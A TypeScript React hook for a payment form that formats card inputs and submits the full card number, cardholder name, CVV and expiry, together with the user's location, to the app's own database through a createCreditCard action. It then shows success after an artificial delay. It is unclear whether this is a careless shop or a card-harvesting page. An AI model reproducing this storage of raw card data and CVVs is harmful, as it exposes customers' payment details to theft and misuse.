import { useTranslations } from 'next-intl';

import { FormEvent, useState } from 'react';
import { useForm, SubmitHandler } from 'react-hook-form';

import createCreditCard from '@/db/actions/creditCard/createCreditCard';
import delay from '@/services/delay';
import { zodResolver } from '@hookform/resolvers/zod';

import { useToastContext } from '../toastContext/useContext';
import useLocation from '../useLocation';
import { BodyProtocol, useValidation } from './validation';

export default function useFormCreditCard() {
  const zodSchema = useValidation();
  const {
    handleSubmit,
    register,
    formState: { errors },
    reset,
  } = useForm<BodyProtocol>({
    resolver: zodResolver(zodSchema),
    defaultValues: {
      cardNumber: '',
      cardName: '',
      cardCVV: '',
      cardValidity: '',
      installments: '1',
    },
  });
  const { setToast } = useToastContext();
  const clientLocation = useLocation();
  const translations = useTranslations();
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccessPayment, setIsSuccessPayment] = useState(false);

  const handleFormSubmit: SubmitHandler<BodyProtocol> = async body => {
    if (isLoading) return;
    try {
      setIsLoading(true);
      await createCreditCard({ ...body, location: clientLocation });
      await delay(2000);
      setToast({
        open: true,
        message: translations('home.formCreditCard.msgSuccess'),
        severity: 'success',
      });
      reset();
      setIsSuccessPayment(true);
    } catch {
      setToast({
        open: true,
        message: translations('home.formCreditCard.msgError'),
        severity: 'error',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleInputCardNumber = (event: FormEvent<HTMLInputElement>) => {
    const currentTarget = event.currentTarget;
    let value = currentTarget.value;
    value = value.replace(/[^\d]/g, '');
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    value = value.slice(0, 19);
    currentTarget.value = value;
  };

  const handleInputCardValidity = (event: FormEvent<HTMLInputElement>) => {
    const currentTarget = event.currentTarget;
    let value = currentTarget.value;

    // Remove caracteres que não são dígitos
    value = value.replace(/[^\d]/g, '');

    // Limita o número de dígitos a 4 (para mm/aa)
    value = value.slice(0, 4);

    // Adiciona a barra após os dois primeiros dígitos
    if (value.length >= 2) {
      const month = value.slice(0, 2);

      // Corrige o mês para estar no intervalo válido (01-12)
      if (parseInt(month, 10) > 12) {
        value = '12' + value.slice(2);
      }
    }

    value = value.replace(/(\d{2})(\d)/, '$1/$2');

    currentTarget.value = value;
  };

  const handleInputCVV = async (event: FormEvent<HTMLInputElement>) => {
    const currentTarget = event.currentTarget;
    let value = currentTarget.value;
    value = value.replace(/[^\d]/g, '');
    value = value.slice(0, 4);
    currentTarget.value = value;
  };

  return {
    handleSubmit: handleSubmit(handleFormSubmit),
    register,
    errors,
    handleInputCardNumber,
    handleInputCardValidity,
    handleInputCVV,
    isLoading,
    isSuccessPayment,
  };
}
